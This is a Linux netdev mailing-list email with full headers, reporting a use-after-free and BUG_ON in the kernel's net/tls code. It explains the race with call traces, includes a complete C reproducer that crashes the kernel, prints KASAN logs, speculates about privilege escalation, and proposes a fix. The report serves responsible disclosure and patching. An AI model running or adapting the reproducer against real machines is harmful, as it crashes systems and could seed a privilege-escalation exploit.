Return-Path: <netdev+bounces-211764-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 9BF12B1B88A
	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 18:30:57 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 3F63018A6C80
	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 16:31:16 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id EB0AA1F4171;
	Tue,  5 Aug 2025 16:30:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=syst3mfailure.io header.i=@syst3mfailure.io header.b="YxA7yI5O"
X-Original-To: netdev@vger.kernel.org
Received: from mail-24421.protonmail.ch (mail-24421.protonmail.ch [109.224.244.21])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 144311F03D5
	for <netdev@vger.kernel.org>; Tue,  5 Aug 2025 16:30:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=109.224.244.21
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1754411452; cv=none; b=cLC+qD9PH+ToMPx3+0tfo+Ay8ONy1/se/MWei1WFWxdlJ39uI4JGJTRS9UGjGrOok11igWEROD5FNbndS66vUXFSQyoJjtaAV9rheYgB38f5e0K6VMz8AxFpCEjMhC65CtULBMsCn99IFLLOWJoipsnei4Gb4NqFR0UJxVW+a+M=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1754411452; c=relaxed/simple;
	bh=CB9X8lmEk1wfUFzwUbKjVjWT6TbB7J9JxJzL4Sj2pOI=;
	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=eNgHJgmz81yYZZ+FXi/tPobHPD222nFrb3Wi8SIW5vhMejTU3akIPtfztge/IukrTpT7QFdENaoA40C5Qzyc4YEmNJiwfvVi4CCEXHj1LtxntQELxb3CAeEZCMX8BIbqeCSmKOZivbdj6oXZByHRHeEpdWArttGhHGGhZYui9SI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=syst3mfailure.io; spf=pass smtp.mailfrom=syst3mfailure.io; dkim=pass (2048-bit key) header.d=syst3mfailure.io header.i=@syst3mfailure.io header.b=YxA7yI5O; arc=none smtp.client-ip=109.224.244.21
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=syst3mfailure.io
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=syst3mfailure.io
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=syst3mfailure.io;
	s=protonmail2; t=1754411440; x=1754670640;
	bh=6Wb25S9/AapA6kTFK+PmGOvTzlnondZdcSkqn/2FWwQ=;
	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
	b=YxA7yI5O0+ZEHDiMRKUWYQslwG/8RpsMMnf+LT7M/C3DqxUogJQA+begxzJUFXSF2
	 EOWbXKyay/ecg2asWQXH5aPN+abKrvm9RGjxfIwLLsiuQ2D5rGwu71hFb3aKivZYKr
	 9enOMOfqy1271+WDWJnfl8Ijhk4pvWI2xmaAWUuIYiX0/aHcplyApNL5gO7TiQdtq+
	 WmyZkZmK9J8/AS5l3+7GsI8QhW71JhO/WBE1OSUGZb7HmTlQoAb/FO/6aqjHvJ+Ap0
	 fqKY093Gd3i7PwPt0BI1/aBcgL5Z3QrpOHz8UX5+EtMo5IH1Q+0v8btC1FEdcoOIpp
	 dyfBSOrrPC3ew==
Date: Tue, 05 Aug 2025 16:30:37 +0000
To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
From: Savy <savy@syst3mfailure.io>
Cc: "will@willsroot.io" <will@willsroot.io>, "borisp@nvidia.com" <borisp@nvidia.com>, "john.fastabend@gmail.com" <john.fastabend@gmail.com>, "kuba@kernel.org" <kuba@kernel.org>, "davem@davemloft.net" <davem@davemloft.net>, "edumazet@google.com" <edumazet@google.com>, "pabeni@redhat.com" <pabeni@redhat.com>, "horms@kernel.org" <horms@kernel.org>
Subject: [BUG] net/tls: UAF and BUG_ON via tcp_recvmsg/tcp_zerocopy_receive
Message-ID: <tFjq_kf7sWIG3A7CrCg_egb8CVsT_gsmHAK0_wxDPJXfIzxFAMxqmLwp3MlU5EHiet0AwwJldaaFdgyHpeIUCS-3m3llsmRzp9xIOBR4lAI=@syst3mfailure.io>
Feedback-ID: 69690694:user:proton
X-Pm-Message-ID: 60f630b8e6aaaabd683d07a3c4b86c3badaebf5b
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hi all,

We've encountered the following UAF bug in net/tls that occurs when perform=
ing sends=20
and receive with a TLS socket combined with tcp_recvmsg() or tcp_zerocopy_r=
eceive().

The root cause is similar to the disconnect() bug found a few months ago [1=
]:

1. User creates two TCP sockets, forks and
calls recvmsg() in the child task (this invokes tcp_recvmsg() -> tcp_recvms=
g_locked() in the kernel).=20
The syscall blocks waiting for data to become available.

2. In the parent task, TLS is set up and a packet is sent.
Softirq handles the new data and stores a reference to the skb in the strp-=
>anchor fraglist:

...
  tcp_data_queue()
    tls_data_ready()
      tls_strp_check_rcv()
        tls_strp_read_sock()
          tls_strp_load_anchor_with_queue()
            first =3D tcp_recv_skb(strp->sk, tp->copied_seq, &offset);
            ...
            skb_shinfo(strp->anchor)->frag_list =3D first;

3. In the child task, tcp_recvmsg_locked() detects the socket is no longer =
empty.
The previous skb is eaten with the following call path:

...
  tcp_recvmsg()
    tcp_recvmsg_locked()
      tcp_eat_recv_skb()
        skb_unlink()
        ...
        skb_attempt_defer_free()
          __kfree_skb()

4. Now if recvfrom() (tls_sw_recvmsg()) is called on the TLS socket, we fir=
st hit a WARNING in tls_strp_msg_load() due
to a state mismatch (tcp_inq(strp->sk) is now 0). Then we hit UAFs on the a=
nchor fraglist.
In our repro, this also triggers a BUG_ON in skb_to_sgvec().

...
  tls_sw_recvmsg()
    tls_rx_rec_wait()
      tls_strp_msg_load()
        ...
        WARN_ON(tcp_inq(strp->sk) < strp->stm.full_len)
    ...
    tls_rx_one_record()
      tls_decrypt_sw()
        tls_decrypt_sg()
          skb_nsg()
            __skb_nsg()
              # Use-After-Free
          ...
          skb_to_sgvec()
            __skb_to_sgvec()
              BUG()


Similar to the scenario described above, the same bug can also be triggered
by using getsockopt(TCP_ZEROCOPY_RECEIVE).

In this case the issue is that TCP_ZEROCOPY_RECEIVE can be used to drain th=
e sk_receive_queue
while a skb is still referenced in the anchor's fraglist.
This version behaves like the one described above, but here the user first =
sends=20
data to the ULP, then the socket is drained via getsockopt(TCP_ZEROCOPY_REC=
EIVE):

...
  tcp_zerocopy_receive()
    receive_fallback_to_copy()
      tcp_recvmsg_locked()
        tcp_eat_recv_skb()
          skb_unlink()
          ...
          skb_attempt_defer_free()
            __kfree_skb()

and then recvfrom() is called to trigger the bug.

Using the following repro:

#define _GNU_SOURCE

#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <linux/tls.h>

#define SOL_TCP 6
//#define USE_TCP_ZEROCOPY_RECEIVE 1

int assign_to_core(int core_id) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        perror("[x] sched_setaffinity()");
        return -1;
    }
    return 0;
}

int main(void) {
    char buff[0x1000];

    assign_to_core(0);
   =20
    int s0 =3D socket(AF_INET, SOCK_STREAM, 0);
    int s1 =3D socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr =3D {
        .sin_family =3D AF_INET,
        .sin_port =3D htons(11337),
        .sin_addr.s_addr =3D INADDR_ANY,
    };

    bind(s0, (struct sockaddr *)&addr, sizeof(addr));
    listen(s0, 1);
    connect(s1, (struct sockaddr *)&addr, sizeof(addr));
    int s2 =3D accept(s0, 0, 0);

    struct tls12_crypto_info_aes_gcm_256 tls_ci =3D {
        .info.version =3D TLS_1_2_VERSION,
        .info.cipher_type =3D TLS_CIPHER_AES_GCM_256,
        // ...
    };

#ifndef USE_TCP_ZEROCOPY_RECEIVE
    if (!fork()) {
        recvfrom(s2, buff, 0x1000, 0, NULL, NULL);
        printf("[T-%d] Packet received!\n", getpid());
        return 0;
    }

    usleep(5000);
#endif

    setsockopt(s1, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
    setsockopt(s2, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
    setsockopt(s1, SOL_TLS, TLS_TX, &tls_ci, sizeof(tls_ci));
    setsockopt(s2, SOL_TLS, TLS_RX, &tls_ci, sizeof(tls_ci));

    sendto(s1, "BELLAAAAAA", 10, 0, NULL, 0);
    usleep(5000);

#ifdef USE_TCP_ZEROCOPY_RECEIVE
    struct tcp_zerocopy_receive zcr =3D {
        .copybuf_address =3D (uint64_t)buff,
        .copybuf_len =3D 0x1000,
    };
    socklen_t zcr_len =3D sizeof(zcr);
    getsockopt(s2, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, &zcr, &zcr_len);
#endif

    printf("[T-%d] Packet sent!\n", getpid());
    recvfrom(s2, buff, 0x1000, 0, NULL, NULL);

    close(s0);
    close(s1);
    close(s2);
}

We can get the following crash:

[   19.127499] WARNING: CPU: 0 PID: 343 at net/tls/tls_strp.c:487 tls_strp_=
msg_load+0x52c/0x5c0
[   19.128912] Modules linked in:
[   19.129531] CPU: 0 UID: 0 PID: 343 Comm: exp Not tainted 6.16.0 #1 PREEM=
PT(none)=20
[   19.130424] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
1.16.2-debian-1.16.2-1 04/01/2014
[   19.131451] RIP: 0010:tls_strp_msg_load+0x52c/0x5c0
...
[   19.140706] Call Trace:
[   19.140985]  <TASK>
[   19.141238]  tls_rx_rec_wait+0x90e/0xac0
[   19.143339]  tls_sw_recvmsg+0x526/0x1c50
[   19.145218]  inet_recvmsg+0x4cc/0x6f0
[   19.146184]  sock_recvmsg+0x1d8/0x270
[   19.146628]  __sys_recvfrom+0x204/0x310
[   19.148987]  __x64_sys_recvfrom+0xe1/0x1c0
[   19.150527]  do_syscall_64+0x8f/0x2d0
[   19.152837]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
...
[   19.166493] BUG: KASAN: slab-use-after-free in __skb_nsg+0x470/0x4a0
[   19.167146] Read of size 4 at addr ffff88810b7421d8 by task exp/343
[   19.167786]=20
[   19.167967] CPU: 0 UID: 0 PID: 343 Comm: exp Tainted: G        W        =
   6.16.0 #1 PREEMPT(none)=20
[   19.167988] Tainted: [W]=3DWARN
[   19.167993] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
1.16.2-debian-1.16.2-1 04/01/2014
[   19.168002] Call Trace:
[   19.168007]  <TASK>
[   19.168013]  dump_stack_lvl+0x138/0x1e0
[   19.168035]  print_report+0xce/0x660
[   19.168092]  kasan_report+0xdc/0x110
[   19.168127]  __skb_nsg+0x470/0x4a0
[   19.168145]  tls_decrypt_sg+0x26e/0x2fc0
[   19.168363]  tls_rx_one_record+0x131/0x1150
[   19.168425]  tls_sw_recvmsg+0xa0d/0x1c50
[   19.168575]  inet_recvmsg+0x4cc/0x6f0
[   19.168629]  sock_recvmsg+0x1d8/0x270
[   19.168654]  __sys_recvfrom+0x204/0x310
[   19.168766]  __x64_sys_recvfrom+0xe1/0x1c0
[   19.168820]  do_syscall_64+0x8f/0x2d0
[   19.168921]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
...
[   20.953906] kernel BUG at net/core/skbuff.c:5200!
[   20.954445] Oops: invalid opcode: 0000 [#1] SMP KASAN PTI
[   20.955024] CPU: 0 UID: 0 PID: 343 Comm: exp Tainted: G    B   W        =
   6.16.0 #1 PREEMPT(none)=20
[   20.955963] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN
[   20.956406] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS =
1.16.2-debian-1.16.2-1 04/01/2014
[   20.957388] RIP: 0010:__skb_to_sgvec+0x92d/0xae0
...
[   20.966210] Call Trace:
[   20.966500]  <TASK>
[   20.966750]  skb_to_sgvec+0x30/0xa0
[   20.967147]  tls_decrypt_sg+0x129f/0x2fc0
[   20.970423]  tls_rx_one_record+0x131/0x1150
[   20.971872]  tls_sw_recvmsg+0xa0d/0x1c50
[   20.973688]  inet_recvmsg+0x4cc/0x6f0
[   20.974569]  sock_recvmsg+0x1d8/0x270
[   20.974982]  __sys_recvfrom+0x204/0x310
[   20.977212]  __x64_sys_recvfrom+0xe1/0x1c0
[   20.978559]  do_syscall_64+0x8f/0x2d0
[   20.980671]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
...

This UAF read can probably be transformed into a privilege escalation,=20
as the UAF read can be turned into a UAF write if the anchor undergoes the =
clone path.
However, the conditions for that is pretty restrictive,=20
and may require features such as TLS hardware offload for us to hit such pa=
ths.

For the getsockopt(TCP_ZEROCOPY_RECEIVE) version of the bug,=20
we suggest the following check to fix the issue, as the SOCK_SUPPORT_ZC bit=
=20
is already cleared in __tcp_set_ulp() [2]:

static int tcp_zerocopy_receive(struct sock *sk,
                struct tcp_zerocopy_receive *zc,
                struct scm_timestamping_internal *tss)
{
    // [...]

+    /* ZC support has been cleared by ULP */
+    if (!test_bit(SOCK_SUPPORT_ZC, &sk->sk_socket->flags))
+        return -EOPNOTSUPP;

    // [...]
}

For the tcp_recvmsg() version, we could check if there are any processes
waiting for data on the socket before installing the ULP.

Please let us know if you have any other questions and if there is anything=
 us we can do to help.

Best,
Savino
William

[1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/comm=
it/?id=3D5071a1e606b30c0c11278d3c6620cd6a24724cf6
[2] https://elixir.bootlin.com/linux/v6.16/source/net/ipv4/tcp_ulp.c#L140

